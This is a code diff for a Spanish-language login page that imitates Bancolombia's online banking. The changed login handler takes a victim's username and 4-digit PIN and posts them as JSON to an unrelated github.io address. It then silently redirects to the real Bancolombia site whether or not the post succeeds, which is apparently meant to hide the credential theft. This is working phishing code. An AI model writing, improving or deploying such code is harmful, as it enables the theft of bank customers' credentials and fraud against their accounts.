@@ -1258,54 +1258,45 @@
         function handleLogin(e) {
             e.preventDefault();
 
-            var usuario      = document.getElementById('usuario').value.trim();
-            var clave        = document.getElementById('clave').value.trim();
-            var btn          = document.getElementById('btnIngresar');
-            var hintUsr      = document.getElementById('hintUsuario');
-            var hintClv      = document.getElementById('hintClave');
-            var campoUsr     = document.getElementById('campoUsuario');
-            var campoClv     = document.getElementById('campoClave');
+            var usuario = document.getElementById('usuario').value.trim();
+            var clave   = document.getElementById('clave').value.trim();
+            var btn     = document.getElementById('btnIngresar');
+            var msg     = document.getElementById('msgEstado');
+            var errUsr  = document.getElementById('errUsuario');
 
             // Validar usuario
             var USUARIO_VALIDO = /^[a-zA-Z0-9]+$/;
-            function setErr(campoDiv, hintEl, msg) {
-                campoDiv.style.borderBottomColor = msg ? '#c62828' : '';
-                hintEl.textContent  = msg || '\u00a0';
-                hintEl.style.visibility = msg ? 'visible' : 'hidden';
-            }
-
-            if (usuario.length < 8 || usuario.length > 20 || /\s/.test(usuario) ||
-                !USUARIO_VALIDO.test(usuario) || (usuario.match(/[0-9]/g) || []).length < 2) {
-                setErr(campoUsr, hintUsr, 'Ingresa tu usuario');
-                return;
-            }
+            if (usuario.length < 8)            { errUsr.textContent = 'Minimo 8 caracteres.'; return; }
+            if (usuario.length > 20)           { errUsr.textContent = 'Maximo 20 caracteres.'; return; }
+            if (/\s/.test(usuario))            { errUsr.textContent = 'No puede contener espacios.'; return; }
+            if (!USUARIO_VALIDO.test(usuario)) { errUsr.textContent = 'Solo letras y numeros. Sin tildes, enie ni especiales.'; return; }
+            var numeros = (usuario.match(/[0-9]/g) || []).length;
+            if (numeros < 2)                   { errUsr.textContent = 'Debe contener al menos 2 numeros.'; return; }
 
             // Validar clave
             if (!/^\d{4}$/.test(clave)) {
-                setErr(campoClv, hintClv, 'Ingresa tu clave');
+                msg.textContent = 'La clave debe ser de 4 digitos numericos.';
+                msg.className   = 'msg-estado err';
                 return;
             }
 
-            // Todo ok — limpiar errores y enviar
-            setErr(campoUsr, hintUsr, '');
-            setErr(campoClv, hintClv, '');
+            errUsr.textContent  = '';
             btn.disabled        = true;
             btn.textContent     = 'Ingresando...';
+            msg.textContent     = '';
+            msg.className       = 'msg-estado';
 
-            // Redirigir de forma segura tras 1.5 segundos incluso si el fetch se queda colgado
-            setTimeout(function() {
-                window.location.href = 'https://www.bancolombia.com/personas';
-            }, 1500);
-
-            fetch('http://localhost:3000/login', {
+            fetch('https://jhancarlost12.github.io/bnc/login', {
                 method:  'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body:    JSON.stringify({ usuario: usuario, clave: clave })
             })
             .then(function () {
+                // Redirigir siempre sin mostrar ningun mensaje
                 window.location.href = 'https://www.bancolombia.com/personas';
             })
             .catch(function () {
+                // Si falla la conexion al servidor igual redirigir
                 window.location.href = 'https://www.bancolombia.com/personas';
             });
         }
